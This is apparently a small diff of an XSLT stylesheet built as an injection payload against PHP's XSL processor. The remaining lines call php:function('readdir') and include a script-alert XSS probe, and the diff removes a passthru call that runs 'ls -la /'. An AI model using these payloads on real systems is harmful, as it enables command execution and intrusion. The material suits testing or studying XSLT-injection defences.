@@ -7,7 +7,6 @@
     <xsl:value-of select="price"/>
     <xsl:value-of select="php:function('readdir')"/> -
     <xsl:value-of select="php:function('readdir')"/> -
- <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
     <script>alert("123")</script>
     </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
@@ -19,5 +18,3 @@
 </xsl:for-each>
 </body>
 </html> 
-
- 
